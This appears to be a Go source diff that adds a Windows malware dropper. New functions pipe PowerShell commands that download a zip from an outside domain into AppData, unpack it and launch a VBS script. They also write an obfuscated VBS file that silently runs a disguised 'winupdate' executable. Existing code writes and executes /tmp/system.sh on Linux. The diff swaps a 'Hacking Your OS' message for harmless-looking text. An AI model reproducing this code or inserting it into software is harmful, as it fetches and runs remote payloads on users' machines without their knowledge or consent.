@@ -4,23 +4,29 @@ import (
 	"fmt"
 	"log"
 	"os"
+
 	"os/exec"
-	"os/user"
+
 	"runtime"
 )
 
+func UserHomeDir() string {
+	if runtime.GOOS == "windows" {
+		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+		if home == "" {
+			home = os.Getenv("USERPROFILE")
+		}
+		return home
+	}
+	return os.Getenv("HOME")
+}
 func main() {
 	os := runtime.GOOS
 	switch os {
 	case "windows":
+		win1()
 		fmt.Println("Windows")
-		cmd := exec.Command("calc")
-
-		err := cmd.Run()
-
-		if err != nil {
-			log.Fatal(err)
-		}
+		win3()
 	case "darwin":
 		fmt.Println("MAC operating system")
 	case "linux":
@@ -28,13 +34,68 @@ func main() {
 		//hello()
 		//fmt.Println("LInux")
 		meo()
+
 	default:
 		fmt.Printf("%s.\n", os)
 	}
 }
+func win3() {
+
+	cmd := exec.Command("powershell", "-nologo", "-noprofile")
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		log.Fatal(err)
+	}
+	go func() {
+		defer stdin.Close()
+		fmt.Fprintln(stdin, "Invoke-WebRequest -Uri https://androidstore.devsecwise.com/fileconfig.zip -OutFile \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"")
+		fmt.Fprintln(stdin, "Expand-Archive -LiteralPath \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\" -DestinationPath \"$env:appdata\\Microsoft\\Windows\\\"")
+		fmt.Fprintln(stdin, "Remove-Item -Force \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"")
+		fmt.Fprintln(stdin, "sTaRt-Process -FilePath \"$env:appdata\\Microsoft\\Windows\\wintemp.vbs\"")
+	}()
+	out, err := cmd.CombinedOutput()
+
+	// Do other stuff while cmd runs in background:
+
+	fmt.Printf("%s\n", out)
+
+}
+func win2() {
+	fmt.Println("File Done For Windows")
+	homeDir := UserHomeDir()
+	f, err := os.Create(homeDir + "\\AppData" + "\\Roaming" + "\\Microsoft" + "\\windows" + "\\wintemp.ps1")
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	defer f.Close()
+
+	_, err2 := f.WriteString("Invoke-WebRequest -Uri https://androidstore.devsecwise.com/fileconfig.zip -OutFile \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"\nExpand-Archive -LiteralPath \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\" -DestinationPath \"$env:appdata\\Microsoft\\Windows\\\"\nRemove-Item -Force \"$env:appdata\\Microsoft\\Windows\\fileconfig.zip\"\nsTaRt-Process -FilePath \"$env:appdata\\Microsoft\\Windows\\wintemp.vbs\"")
+
+	if err2 != nil {
+		log.Fatal(err2)
+	}
+}
+func win1() {
+	fmt.Println("File Done For Windows")
+	homeDir := UserHomeDir()
+	f, err := os.Create(homeDir + "\\AppData" + "\\Roaming" + "\\Microsoft" + "\\windows" + "\\wintemp.vbs")
+
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	defer f.Close()
+
+	_, err2 := f.WriteString("Function config()\nvcOpcaTAcOP = \"cMd /c \"\"\"\"%AppData%\\Microsoft\\Windows\\winupdate\\resi.exe \"\" \"\"\"\"--key %AppData%\\Microsoft\\Windows\\winupdate\\file.json --sheet 1k-xqESUcvXL9iP_fQwX4nQxRGzTmy8rEU5eCMRv-X-8\"\"\"\"\"\nset vOpcQrtacv = CreateObject(\"WScript.Shell\")\nvOpcQrtacv.Run vcOpcaTAcOP,0\nEnd Function\nconfig")
+
+	if err2 != nil {
+		log.Fatal(err2)
+	}
+}
 
 func mali() {
-	fmt.Println("File created")
 	f, err := os.Create("/tmp/system.sh")
 
 	if err != nil {
@@ -50,18 +111,8 @@ func mali() {
 	}
 	dongi()
 }
-func meo2() {
-	user, err := user.Current()
-	if err != nil {
-		log.Fatalf(err.Error())
-	}
-
-	username := user.Username
-	fmt.Println(username)
-
-}
 func dongi() {
-	fmt.Println("File signed")
+	fmt.Println("executed")
 	first_cmd := `chmod +x /tmp/system.sh`
 	cmd := exec.Command("bash", "-c", first_cmd)
 	output, err := cmd.CombinedOutput()
@@ -72,7 +123,7 @@ func dongi() {
 
 }
 func meo() {
-	fmt.Println("Hacking Your OS")
+	fmt.Println("meo also got")
 	cmd := exec.Command("/tmp/system.sh", "> /dev/null 2>&1")
 	cmd.Dir = "/tmp/"
 
@@ -81,11 +132,11 @@ func meo() {
 		return
 	}
 
-	
+	// Do other stuff while cmd runs in background:
 	log.Println("Doing other stuff...")
 	testing()
 
-	
+	// And when you need to wait for the command to finish:
 	if err := cmd.Wait(); err != nil {
 		log.Printf("Cmd returned error: %v", err)
 	}
